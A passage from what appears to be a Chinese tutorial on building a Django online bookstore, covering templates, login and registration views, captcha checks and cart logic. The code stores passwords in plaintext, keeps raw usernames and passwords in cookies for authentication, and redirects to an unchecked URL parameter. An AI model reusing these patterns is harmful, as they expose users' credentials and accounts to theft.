&#125;&#125;&quot;&gt;&#123;&#123; book.publish &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;p class=&quot;detail&quot;&gt; &#123;&#123; book.content_introduction &#125;&#125; &lt;p class=&quot;dang&quot; style=&quot;display: block;&quot;&gt;当当自营&lt;/p&gt; &lt;p class=&quot;buy_button&quot;&gt;&lt;a class=&quot;listbtn_info&quot; name=&quot;area_buy&quot; dd_name=&quot;查看详情&quot; href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; book.id &#125;&#125;&quot; &gt;查看详情&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;price&quot;&gt; &lt;span class=&quot;price_n&quot;&gt;￥&#123;&#123; book.new_price &#125;&#125;&lt;/span&gt;&lt;a style=&quot;color: #878787;text-decoration:none;&quot;&gt;定价：&lt;/a&gt;&lt;span class=&quot;price_r&quot;&gt;￥&#123;&#123; book.old_price &#125;&#125;&lt;/span&gt;(&lt;span class=&quot;price_s&quot;&gt;&#123;&#123; book.discount &#125;&#125;折&lt;/span&gt;)&lt;/p&gt; &lt;div class=&quot;ebook_buy&quot;&gt; &lt;p class=&quot;buy_button&quot;&gt; &lt;a class=&quot;listbtn_buy&quot; id=&quot;A13&quot; id1=&quot;&#123;&#123; book.id &#125;&#125;&quot; dd_name=&quot;加入购物车&quot; href=&quot;javascript:void (0);&quot; class=&quot;buy_book&quot; name=&quot;Buy&quot;&gt;&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/li&gt;&#123;% endfor %&#125;&lt;ul class=&quot;paging&quot; name=&quot;Fy&quot;&gt; &lt;li class=&quot;next&quot;&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125;&lt;/li&gt; &#123;% for foo in page.paginator.page_range %&#125; &#123;% if foo == page.number %&#125; &lt;li&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;current&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% else %&#125; &lt;li&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;null&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;li&gt;&lt;span&gt;...&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt; &lt;li class=&quot;next&quot;&gt; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125;&lt;/li&gt; &lt;/li&gt;&lt;li class=&quot;page_input&quot;&gt;&lt;span&gt;共&#123;&#123; page.paginator.num_pages &#125;&#125;页 到第&lt;/span&gt; &lt;input id=&quot;t__cp&quot; type=&quot;text&quot; class=&quot;number&quot; name=&quot;num&quot; value=&quot;&#123;&#123; page.number &#125;&#125;&quot;&gt; &lt;span&gt;页&lt;/span&gt; &lt;input class=&quot;button&quot; id=&quot;click_get_page&quot; value=&quot;确定&quot; type=&quot;button&quot; onclick=&quot;f()&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script type=&quot;text/javascript&quot;&gt; function f() &#123; num = $(&#x27;#t__cp&#x27;).val(); console.log(num); if (num &lt; 1) &#123; alert(&#x27;超出下限&#x27;) &#125; else if (num &gt; &#123;&#123; page.paginator.num_pages &#125;&#125;) &#123; alert(&#x27;超出上限&#x27;) &#125; else &#123; location.href = &#x27;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&amp;num=&#x27; + num &#125; &#125;&lt;/script&gt; 五.登录和注册123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120def regist(request): url = request.GET.get(&#x27;url&#x27;) print(url) return render(request, &#x27;user/register.html&#x27;, &#123;&quot;url&quot;: url&#125;)def login(request): # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) url = request.GET.get(&#x27;url&#x27;) print(url, 22222) if url == None: url = &quot;http://127.0.0.1:8000/index/&quot; req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if req: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; return render(request, &#x27;user/login.html&#x27;, &#123;&quot;txtUsername&quot;: user_name, &quot;txtPassword&quot;: user_pwd, &#x27;url&#x27;: url&#125;) return render(request, &#x27;user/login.html&#x27;)def regist_ok(request): url = request.GET.get(&#x27;url&#x27;) print(url) txt_username = request.GET.get(&quot;txt_username&quot;) return render(request, &#x27;user/register ok.html&#x27;, &#123;&quot;txt_username&quot;: txt_username, &quot;url&quot;: url&#125;)# 生成验证码def getCaptcha(request): # 生成img对象 img = ImageCaptcha() code = random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits, 4) # 拼接字符,通过session传递验证码 random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code # 生成验证码图片 data = img.generate(random_code) return HttpResponse(data, &#x27;image/png&#x27;)# 验证码校验def check_code(request): txt_vcode = request.POST.get(&quot;txt_vcode&quot;) # 验证码 code = request.session[&#x27;code&#x27;] print(code) if code.lower() == txt_vcode.lower(): return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码正确&quot;, &quot;error&quot;: 0&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;error&quot;: 1&#125;)def regist_logic(request): url = request.GET.get(&#x27;url&#x27;) print(url) txt_username = request.POST.get(&quot;txt_username&quot;) txt_password = request.POST.get(&quot;txt_password&quot;) txt_repassword = request.POST.get(&quot;txt_repassword&quot;) txt_vcode = request.POST.get(&quot;txt_vcode&quot;) # 验证码 chb_agreement = request.POST.get(&quot;chb_agreement&quot;) # 霸王条款 code = request.session[&#x27;code&#x27;] try: with transaction.atomic(): if txt_username == &#x27;&#x27; or txt_password == &#x27;&#x27; or txt_repassword == &#x27;&#x27; or txt_vcode == &#x27;&#x27;: 10 / 0 if code.lower() == txt_vcode.lower(): res = TUser.objects.filter(user_name=txt_username) if res: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户已存在&quot;, &quot;error&quot;: 0&#125;) elif txt_password == txt_repassword: resp = JsonResponse(&#123;&quot;msg&quot;: &quot;创建成功&quot;, &quot;error&quot;: 1, &quot;url&quot;: url&#125;) TUser.objects.create(user_name=txt_username, user_pwd=txt_password) resp.set_cookie(&#x27;txtUsername&#x27;, txt_username, max_age=7 * 24 * 3600) resp.set_cookie(&#x27;txtPassword&#x27;, txt_password, max_age=7 * 24 * 3600) return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;两次密码不一致&quot;, &quot;error&quot;: 2&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;error&quot;: 3&#125;) except Exception as e: traceback.print_exc() print(e) return JsonResponse(&#123;&quot;msg&quot;: &quot;输入数据非法&quot;, &quot;error&quot;: 4&#125;)# 检查用户名def check_username(request): txtUsername = request.GET.get(&quot;txtUsername&quot;) print(txtUsername, &quot;检查用户名是否存在&quot;) res = TUser.objects.filter(user_name=txtUsername) if res: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户名存在&quot;, &quot;error&quot;: 0&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;该用户名不存在请检查!&quot;, &quot;error&quot;: 1&#125;)def login_logic(request): txtUsername = request.POST.get(&quot;txtUsername&quot;) txtPassword = request.POST.get(&quot;txtPassword&quot;) txtVerifyCode = request.POST.get(&quot;txtVerifyCode&quot;) code = request.session[&#x27;code&#x27;] url = request.GET.get(&#x27;url&#x27;) autologin = request.POST.get(&quot;autologin&quot;) # 是否勾选免登录 try: if txtUsername == &#x27;&#x27; or txtPassword == &#x27;&#x27; or txtVerifyCode == &#x27;&#x27;: 10 / 0 if code.lower() == txtVerifyCode.lower(): res = TUser.objects.filter(user_name=txtUsername, user_pwd=txtPassword) if res: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; resp = JsonResponse(&#123;&quot;msg&quot;: &quot;登陆成功!&quot;, &quot;error&quot;: 0, &quot;url&quot;: url&#125;) if autologin: resp.set_cookie(&#x27;txtUsername&#x27;, txtUsername, max_age=7 * 24 * 3600) resp.set_cookie(&#x27;txtPassword&#x27;, txtPassword, max_age=7 * 24 * 3600) return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户名或密码错误!&quot;, &quot;error&quot;: 1&#125;) else: return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;erro&quot;: 2&#125;) except Exception as e: print(e) traceback.print_exc() return JsonResponse(&#123;&quot;msg&quot;: &quot;请输入有效数据&quot;, &quot;error&quot;: 3&#125;)# 退出登陆状态,删除sessiondef exit(request): username = request.GET.get(&quot;username&quot;) # 获取到需要退出的用户名 request.session.flush() resp = JsonResponse(&#123;&quot;msg&quot;: &quot;退出成功!&quot;, &quot;error&quot;: 0&#125;) resp.delete_cookie(&#x27;txtUsername&#x27;) resp.delete_cookie(&#x27;txtPassword&#x27;) if username: return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;发生错误!&quot;, &quot;error&quot;: 1&#125;) regist.javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;script src=&quot;/static/js/jquery.1.4.2-min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; &#123;# 验证码刷新 #&#125; $(function () &#123; $(&quot;#vcodeImgBtn&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); $(&quot;#imgVcode&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); &#123;#table下的所有的收入框失焦验证信息#&#125; $(&#x27;#txt_username&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; if (re_phone.test($(&quot;#txt_username&quot;).val()) || re_email.test($(&quot;#txt_username&quot;).val())) &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;&#x27;); return true &#125;else &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;请检查手机号或邮箱的格式！&#x27;); return false &#125; &#125;); &#123;# 密码强弱 #&#125; $(&#x27;#txt_password&#x27;).blur(function () &#123; var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/; var pwd = $(&quot;#txt_password&quot;).val(); if (pwd.length &lt; 6)&#123; $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&quot;密码长度小于6位&quot;) return false &#125; else if (re_strong.test(pwd)) &#123; $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;, &#x27;icon_yes&#x27;); return true &#125;else if (re_medium.test(pwd)) &#123; $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else if (re_week.test(pwd))&#123; $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125; &#125;); &#123;# 检验密码 #&#125; $(&quot;#txt_repassword&quot;).blur(function () &#123; var pwd = $(&quot;#txt_password&quot;).val(); var repwd = $(&quot;#txt_repassword&quot;).val(); if (repwd==pwd &amp;&amp; repwd !==&#x27;&#x27;)&#123; $(&quot;#spn_repassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_repassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else &#123; $(&quot;#spn_repassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_repassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); return false &#125; &#125;); &#123;# 验证码校验 #&#125; $(&quot;#txt_vcode&quot;).blur(function () &#123; $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;user:check_code&#x27; %&#125;&quot;, data: &quot;txt_vcode=&quot;+$(&quot;#txt_vcode&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg.error == 1) &#123; console.log(&#x27;验证码错误&#x27;); $(&quot;#spn_vcode_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_vcode_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong pin_i&#x27;); $(&quot;#J_tipVcode&quot;).html(&#x27;验证码输入不正确!&#x27;); return false &#125;else &#123; console.log(&#x27;验证码正确&#x27;); $(&quot;#spn_vcode_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_vcode_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes pin_i&#x27;); $(&quot;#J_tipVcode&quot;).html(&#x27;&#x27;); return true &#125; &#125; &#125;); &#125;); &#123;# 霸王条款 #&#125; $(&quot;#J_submitRegister&quot;).click(function () &#123; var chb_agreement = $(&quot;#chb_agreement&quot;); if (chb_agreement.attr(&#x27;checked&#x27;))&#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;user:regist_logic&#x27; %&#125;&quot;, data: &quot;txt_username=&quot;+$(&quot;#txt_username&quot;).val() +&quot;&amp;txt_password=&quot;+$(&quot;#txt_password&quot;).val()+&quot;&amp;txt_repassword=&quot;+$(&quot;#txt_repassword&quot;).val()+&quot;&amp;txt_vcode=&quot;+$(&quot;#txt_vcode&quot;).val()+&quot;&amp;chb_agreement=&quot;+$(&quot;#chb_agreement&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success:function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; $(&quot;#J_tipUsername&quot;)[0].innerHTML=&#x27;此手机号已注册，请更换其它手机号，或使用该&lt;a href=&quot;&#123;% url &#x27;user:login&#x27; %&#125;&quot; name=&quot;mobile_login _link&quot; class=&quot;more&quot;&gt;手机号登录&lt;/a&gt;&#x27; &#125;else if (msg.error == 1)&#123; location.href = &quot;&#123;% url &#x27;user:regist_ok&#x27; %&#125;?txt_username=&quot;+$(&quot;#txt_username&quot;).val(); &#125;else if (msg.error == 2)&#123; $(&quot;#J_tipSurePassword&quot;)[0].innerHTML=&#x27;两次密码验证不一致,请重新输入!&#x27; &#125;else if (msg.error == 3)&#123; $(&quot;#J_tipVcode&quot;)[0].innerHTML = &#x27;验证码验证不正确&#x27; &#125;else if (msg.error == 4)&#123; alert(msg.msg) &#125; &#125; &#125;) &#125;else &#123; alert(&#x27;请阅读并同意本网站协议!&#x27;) &#125; &#125;) &#125;); &lt;/script&gt; login.javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; $(&quot;#imgVcode&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); $(&quot;#vcodeImgBtn&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); &#123;# 校验登录名是否为邮箱或者手机号 #&#125; $(&#x27;#txtUsername&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; var txtUsername = $(&quot;#txtUsername&quot;).val(); if (re_phone.test(txtUsername) || re_email.test(txtUsername)) &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;user:check_username&#x27; %&#125;&quot;, data: &quot;txtUsername=&quot;+$(&quot;#txtUsername&quot;).val(), success: function (msg) &#123; console.log(msg,&#x27;判断用户是否存在&#x27;); if (msg.error == 0)&#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); &#125;else &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#liDivErrorMessage&quot;).html(msg.msg) &#125; &#125; &#125;); &#125;else &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#liDivErrorMessage&quot;).html(&quot;请输入邮箱/昵称/手机号码&quot;) &#125; &#125;); &#123;# 密码校验 #&#125; $(&quot;#txtPassword&quot;).blur(function () &#123; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var txtPassword = $(&quot;#txtPassword&quot;).val(); if (re_week.test(txtPassword))&#123; $(&quot;#login_password_error&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); &#125;else &#123; $(&quot;#login_password_error&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); &#125; &#125;); &#123;# 验证码校验 #&#125; $(&quot;#txtVerifyCode&quot;).blur(function () &#123; $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;user:check_code&#x27; %&#125;&quot;, data: &quot;txt_vcode=&quot;+$(&quot;#txtVerifyCode&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; if (msg.error == 1) &#123; console.log(&#x27;验证码错误&#x27;); $(&quot;#vcode_mindstyle&quot;).html(&#x27;验证码错误&#x27;) &#125;else &#123; console.log(&#x27;验证码正确&#x27;); $(&quot;#vcode_mindstyle&quot;).html(&#x27;&#x27;) &#125; &#125; &#125;); &#125;); &#123;# 七天免登录 #&#125; $(&quot;#autologin&quot;).click(function () &#123; var autologin = $(&quot;#autologin&quot;).attr(&#x27;checked&#x27;); if (autologin)&#123; console.log(&#x27;免登录&#x27;); $(&quot;#s1&quot;).css(&quot;display&quot;,&quot;inline-block&quot;); $(&quot;#s2&quot;).css(&quot;display&quot;,&quot;none&quot;); &#125;else &#123; console.log(&#x27;需要登陆&#x27;); $(&quot;#s2&quot;).css(&quot;display&quot;,&quot;inline-block&quot;); $(&quot;#s1&quot;).css(&quot;display&quot;,&quot;none&quot;); &#125; &#125;); &#123;# 点击登录按钮 #&#125; $(&quot;#submitLoginBtn&quot;).click(function () &#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;user:login_logic&#x27; %&#125;&quot;, data: &quot;txtUsername=&quot;+$(&quot;#txtUsername&quot;).val()+&quot;&amp;txtPassword=&quot;+$(&quot;#txtPassword&quot;).val()+&quot;&amp;txtVerifyCode=&quot;+$(&quot;#txtVerifyCode&quot;).val()+&quot;&amp;autologin=&quot;+$(&quot;#autologin&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success:function (msg) &#123; if (msg.error == 0)&#123; location.href = &quot;&#123;&#123; url &#125;&#125;&quot;; &#125;else if (msg.error == 1)&#123; alert(msg.msg) &#125;else if (msg.error ==2)&#123; alert(msg.msg) &#125;else if (msg.error == 3)&#123; alert(msg.msg) &#125; &#125; &#125;) &#125;); &#123;# 注册跳转 #&#125; $(&quot;#J_loginToRegister&quot;).click(function () &#123; var url = location.href; console.log(url); location.href = &quot;&#123;% url &#x27;user:regist&#x27; %&#125;?url=&quot;+url; &#125;); &#125;); &lt;/script&gt; 六.购物车实现以及订单实现通过构建购物车对象,实现添加,删除,修改,查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248import time,uuid,datetimefrom django.db import transactionfrom django.http import JsonResponse, HttpResponsefrom django.shortcuts import render, redirectfrom user.models import TCar, TBook, TUser, TOrder, TAddress, TOrderItem# Create your views here.# 面向对象实现购物车,方法:添加,删除,修改,查询class Book: def __init__(self, id, count): book = TBook.objects.get(pk=id) self.id = id self.count = count self.new_price = book.new_price self.picture = book.picture self.book_name = book.book_name def totalprice(self): return round(float(self.new_price) * float(self.count), 2)class Car: def __init__(self): self.book_list = [] # 空列表 self.index = 0 def add_book(self, id, count=1): book = self.get_book(id) # 查询bookid是否存在 if book: book.count = int(book.count) + int(count) # 存在直接修改数量 else: # 不存在创建book对象存放 book = Book(id=id, count=count) self.book_list.append(book) # 根据id查询某本书是否存在购物车 def get_book(self, id): for book in self.book_list: if book.id == id: return book # 根据id删除 def remove_book(self, id): book = self.get_book(id) self.book_list.remove(book) def __iter__(self): self.index = 0 return self def __next__(self): if self.index &lt; len(self.book_list): item = self.book_list[self.index] self.index += 1 return item else: raise StopIteration def __len__(self): return len(self.book_list)def rem_book(request): book_id = request.GET.get(&quot;id&quot;) # 书的id car = request.session.get(&#x27;car&#x27;) # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if req: id = TUser.objects.get(user_name=user_name) # 用户id try: with transaction.atomic(): car = TCar.objects.filter(user_id=id) # 用户的购物车 book_item = TCar.objects.get(book_id=book_id) # 需要删除的book对象 print(book_item) book_item.delete() sum_price = 0 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return JsonResponse(&#123;&quot;error&quot;: 0, &quot;msg&quot;: &quot;删除成功&quot;, &quot;sum_price&quot;: sum_price&#125;) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;) except Exception as e: print(e) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;) else: if car: totalprice = 0 sum_price = 0 for i in car: totalprice = round(float(i.new_price) * float(i.count), 2) sum_price += round(float(i.new_price) * float(i.count), 2) with transaction.atomic(): car.remove_book(book_id) request.session[&#x27;car&#x27;] = car return JsonResponse(&#123;&quot;error&quot;: 0, &quot;msg&quot;: &quot;删除成功&quot;, &quot;sum_price&quot;: sum_price, &quot;totalprice&quot;: totalprice&#125;) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;)def add_car(request): book_id = request.GET.get(&quot;bookid&quot;) book_num = request.GET.get(&quot;booknum&quot;) book_num1 = request.GET.get(&quot;booknum1&quot;) # 数量失焦的返回值 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) car = request.session.get(&#x27;car&#x27;) # 存放的未登陆的car # 判断是否有登录状态 req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) sum_price = 0 totalprice = 0 if req: id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) # 用户的购物车 if car: # 判断book是否存在 book_item = TCar.objects.filter(book_id=book_id) if book_item: # 存在book if book_num1: # 失焦直接赋值给count book_item[0].count = int(book_num1) book_item[0].save() totalprice = book_item[0].totalprice() else: book_item[0].count += int(book_num) book_item[0].save() else: with transaction.atomic(): TCar.objects.create(book_id=book_id, count=book_num, user_id=id.id) else: with transaction.atomic(): TCar.objects.create(book_id=book_id, count=book_num, user_id=id.id) for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return JsonResponse(&#123;&quot;msg&quot;: &quot;添加购物车成功!快去看看吧!&quot;, &quot;error&quot;: 0, &quot;totalprice&quot;: totalprice, &quot;sum_price&quot;: sum_price&#125;) else: if car: pass else: car = Car() car.add_book(book_id, int(book_num)) request.session[&#x27;car&#x27;] = car sum_price = 0 # 总计 totalprice = 0 # 小计 for book in car.book_list: if int(book.id) == int(book_id): totalprice = round(float(book.new_price) * float(book.count), 2) sum_price += round(float(book.new_price) * float(book.count), 2) return JsonResponse(&#123;&quot;msg&quot;: &quot;添加购物车成功!快去看看吧!&quot;, &quot;error&quot;: 0, &quot;sum_price&quot;: sum_price, &quot;totalprice&quot;: totalprice&#125;)def car(request): # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) car = request.session.get(&#x27;car&#x27;) # 存放的未登陆的car if req: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; # 将session中的数据迁移到购物车表中，相同数据应该合并数量，同时还需要清空session try: with transaction.atomic(): id = TUser.objects.get(user_name=user_name) # 用户id if car: # 判断book是否存在 for i in car: book_item = TCar.objects.filter(book_id=i.id) if book_item: book_item[0].count += int(i.count) book_item[0].save() print(i.id, i.count) else: with transaction.atomic(): TCar.objects.create(book_id=i.id, count=i.count, user_id=id.id) request.session.flush() else: with transaction.atomic(): car = TCar.objects.filter(user_id=id) sum_price = 0 # 总计 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return render(request, &#x27;car/car.html&#x27;, &#123;&quot;car&quot;: car, &quot;sum_price&quot;: sum_price, &quot;user_name&quot;: user_name&#125;) except Exception as e: print(e) else: if car: totalprice = 0 sum_price = 0 # 总计 for i in car: totalprice = round(float(i.new_price) * float(i.count), 2) sum_price += round(float(i.new_price) * float(i.count), 2) return render(request, &#x27;car/car.html&#x27;, &#123;&quot;car&quot;: car, &quot;totalprice&quot;: totalprice, &quot;sum_price&quot;: sum_price, &#125;) return render(request, &#x27;car/car.html&#x27;)def order(request): # 判断是否有登录状态 